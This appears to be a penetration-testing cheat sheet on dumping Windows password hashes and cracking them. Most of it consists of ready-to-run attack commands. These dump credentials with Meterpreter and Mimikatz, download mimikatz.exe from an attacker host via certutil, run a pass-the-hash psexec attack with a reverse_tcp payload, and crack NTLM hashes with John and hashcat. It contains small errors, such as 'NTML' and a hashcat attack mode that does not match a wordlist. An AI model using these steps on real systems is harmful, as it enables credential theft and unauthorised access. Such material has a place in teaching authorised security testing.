# Windows - Dump/Crack Hashes

## Dumping

Required elevated privilege

```bash
# meterpreter tool
hashdump
```

```bash
# windows local password file
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml 
```

### Mimikatz

**Mimikatz** is a Windows post-exploitation tool. It allows fot the extraction of clear-text passwords, hashes and kerberos tickets from memory.

**Required**:

* **pwd the target** with shell/meterpreter
* login with a **high privilege account**

{% code title="Metasploit module" %}
```bash
# load the kiwi module
load kiwi

# get help menu
?

# retrieve all credentials with kiwi
creds_all

# dump from SAM db
lsa_dump_sam
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use post/windows/gather/hashdump
set SESSION
run
```
{% endcode %}

{% code title="Shell" %}
```bash
# create a 'Temp' dir on Target Machine
mkdir Temp

# cp mimikatz file and host server in attack machine on port 80
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server 80

# download .exe from attack machine
certutil -urlcache -f http://IP:80/mimikatz.exe mimikatz.exe
```
{% endcode %}

{% code title="mimikatz.exe" %}
```bash
# create a 'Temp' dir
mkdir Temp

# upload .exe from meterpreter to target machine
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

# execute the program via shell in the target machine
.\mimikatz.exe

# check required privileges
privilege::debug

# lsa dump from SAM db
lsadump::sam

# show clear-text passwords
sekurlsa::logonpasswords
```
{% endcode %}

***

### Pass-The-Hash Attack

**PTH attack** is a exploitation technique that involves capturing or harvesting NTML hashes or clear-text passwords and utilize them **to auth** with the target legitimately.

We can use the **PsExec** module to legitimately authenticate with the target system **via SMB**.

```bash
# with the high privilege account we can get a all hash stored in the target
hashdump

# with the NTML hash we can try access in other account with PsExec module
use exploit/windows/smb/psexec
set RHOSTS
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser USER
set SMBPass NTML_HASH
exploit
```

NTLS Hash: Administrator:500:_aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d_:::

***

## Cracking

<pre class="language-bash"><code class="lang-bash"><strong># unzip rockyou.txt
</strong><strong>gzip -d rockyou.txt.gz
</strong></code></pre>

Copy the result of hashdump in a file

{% code title="file.txt" %}
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
```
{% endcode %}

Crack it with John or hashcat

{% code title="JohnTheRipper" %}
```bash
john --format=NT file.txt --wordlist=/PATH/TO/rockyou.txt
```
{% endcode %}

{% code title="Hashcat" %}
```bash
# check the code of specific format
hashcat --help

# crack NTML
hashcat -a 3 -m 1000 file.txt /PATH/TO/rockyou.txt

# -m: hash format 
# -a: 
```
{% endcode %}

{% code title="Metasploit" %}
```bash
use auxiliary/analyze/crack_windows
show options
run
```
{% endcode %}
